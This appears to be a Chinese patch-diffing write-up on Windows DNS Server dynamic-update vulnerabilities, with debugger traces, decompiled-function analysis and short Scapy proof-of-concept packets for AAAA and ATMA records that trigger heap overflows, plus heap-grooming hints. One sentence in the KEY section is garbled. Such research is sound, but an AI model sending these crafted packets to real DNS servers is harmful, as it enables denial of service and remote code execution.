@@ -1,0 +1,62 @@
+然后通过 type 类型从 RawRecordFileWrite 表中选择相应的 FileWrite 处理函数，type 18 对应的是
+SigFileWrite 函数，然后调用这个函数。（IDA 下面解析错了，实际上 SigFileWrite 函数有 4 个参数）
+SigFileWrite 函数用于解析 SIG 结构并将其写入 MAL.dns 缓存，如下所示，SigFileWrite 函数拿到的初始缓存缓冲区指针为
+p_buffer(来自第二个参数)，在向其写入 SIG 头信息以及 Signer's name 后，v13 指向该缓冲区待写入的地址，然后调用
+Dns_SecurityKeyToBase64String 函数对 Signature 进行 Base64 编码并将结果写入 v13 指向的地址处。
+如下所示，在调用 Dns_SecurityKeyToBase64String 函数时，第二个参数为 0xffb9，经过 Base64 编码后的数据长度为
+0x154f8。查看上下文可以发现（上图所示），在向缓冲区写入的每一步几乎都用了 end_addr(用户可用的最大长度) 作为限制，唯独在
+Dns_SecurityKeyToBase64String 函数的调用中没有，这可能会造成隐患。
+    0:011> g
+    Breakpoint 1 hit
+    dns!Dns_SecurityKeyToBase64String:
+    00007ff7`50d02bd4 48895c2408      mov     qword ptr [rsp+8],rbx ss:000000bc`b867f3b0=000000bcb867f430
+    0:011> r rdx
+    rdx=000000000000ffb9
+    0:011> ?ffb9/3*4
+    Evaluate expression: 87284 = 00000000`000154f4
+    0:011> db r8 l20
+    00000271`34c16255  00 c0 c0 c0 c0 c0 c0 c0-c0 c0 c0 c0 c0 c0 c0 c0  ................
+    00000271`34c16265  c0 c0 c0 c0 c0 c0 c0 c0-c0 c0 c0 c0 c0 c0 c0 c0  ................
+    0:011> gu
+    dns!SigFileWrite+0x1f2:
+    00007ff7`50cc7f02 4c8bc8          mov     r9,rax
+    0:011> db 271`34c16255+154f4 l20    // 写入了 0x154f8 字节数据
+    00000271`34c2b749  41 41 41 3d c0 c0 c0 c0-c0 c0 c0 c0 c0 c0 c0 c0  AAA=............
+    00000271`34c2b759  c0 c0 c0 c0 c0 c0 c0 c0-c0 c0 c0 c0 c0 c0 c0 c0  ................
+由于向 zoneTraverseAndWriteToFile 函数中传入的第一个参数是不变的，因而会一直向该缓冲区中写入数据。虽然在
+RR_WriteToFile 函数和 SigFileWrite 函数中有一些判断，但仍未考虑数据 Base64
+编码后的长度，因而在多次循环写入的时候，正好在 Dns_SecurityKeyToBase64String 函数的执行过程中触发 OOB 写操作。
+**补丁分析** 更新后的 DNS 在 SigFileWrite 函数中调用 Dns_SecurityKeyToBase64String
+函数前会进行以下判断。会考虑当前缓冲区的剩余空间是否可以容纳 Base64 编码后的 Signature 数据。
+### 补丁对比分析
+以下为 3 月更新内发生变动的函数列表，包括前面已经分析过的TxtFileWrite 函数和 SigFileWrite 函数。
+  * **KEY 记录问题**
+类似地，在 KeyFileWrite 函数中也加入了 Base64 编码预检查（粉框对应）。但不是这个的问题，补丁前已经有 a3 - (signed
+__int64)a2  db rdx l10    //例：fe80::20c:29ff:fe5e:7b11
+    00000271`26ed9ecd  fe 80 00 00 00 00 00 00-02 0c 29 ff fe 5e 7b 11  ..........)..^{.
+新的 AaaaFileWrite 函数中也会加入对待读缓冲区和待写缓冲区的判断。
+构造如下 POC 进行验证，崩溃场景如下图：
+        query = DNSQR(qname='mal', qtype='SOA')
+        RRAaaa = DNSRR(rrname=str(RandString(8))+'.mal',type='AAAA',rdlen=1,rdata='fe80::20c:29ff:fe5e:7b11')
+        packet = IP(dst=ip)/UDP()/DNS(id=random.randint(0,65535),opcode=5,qd=query,ns=RRAaaa)
+  * **ATMA 记录问题**
+下面再来看 AtmaFileWrite 函数，CopyWireRead 函数中给的限制是：它的 Data Length 长度要大于等于 2。对比补丁前后，对
+Data Length 长度判断吸引了我的注意（右边），如果是 0，就走结束流程。那么再看不补丁前的函数，v6 为 Data Length - 1
+的无符号数，当 Data Length 为 0 时，v6 为 0xFFFFFFFF , 会产生整数溢出。而且，当 Data 数据的第一个字节为 1 时，会以
+v6 做为控制长度向缓冲区复制数据（堆溢出）。
+构造 ATMA 更新请求如下，为了使 Data Length 为 0 时，满足漏洞触发条件，需要在发送恶意请求时发送一些“铺垫”数据，即保证 Data
+数据的第一个字节（a1 偏移 0x38 处）为 1，且分配的大小一致。那么当触发漏洞的请求到来时，申请的堆可能就来自之前的数据包。例：rdl 先 1（多个）
+后 0（分配到 0x50 大小的自定义堆上），崩溃现场如下图：
+        query = DNSQR(qname='mal', qtype='SOA')
+        RRATMA = DNSRR(rrname="A.mal",type='ATMA',rdlen=rdl,rdata='\x01'*0xff)
+        packet = IP(dst=ip)/UDP()/DNS(id=random.randint(0,65535),opcode=5,qd=query,ns=RRATMA)
+  * **WKS 记录问题**
+WksFileWrite 函数中会打印 IP 地址，还有协议名称，这需要保证数据必须大于等于5。如果发送的数据不到
+5，就会读取到后面的数据，这样会存在一定程度的信息泄露（然而我觉得没什么用）。
+### 总结
+微软 3 月补丁日公开了 Windows DNS Server 中存在的多个远程代码执行漏洞和拒绝服务漏洞，这些漏洞都存在于 Windows DNS
+Server 进行动态区域更新的过程中。攻击者可通过向目标主机发送特制请求来利用这些漏洞，成功利用这些漏洞可在目标主机上以 SYSTEM
+权限执行任意代码或导致 DNS 服务拒绝服务。通过对 McAfee 博客中的细节描述进行分析以及补丁比对，笔者构造 POC 复现了其中的 5 个（不包括
+WKS）。如有不足之处，欢迎批评指正，期待技术交流。
+### 参考链接
+* * *
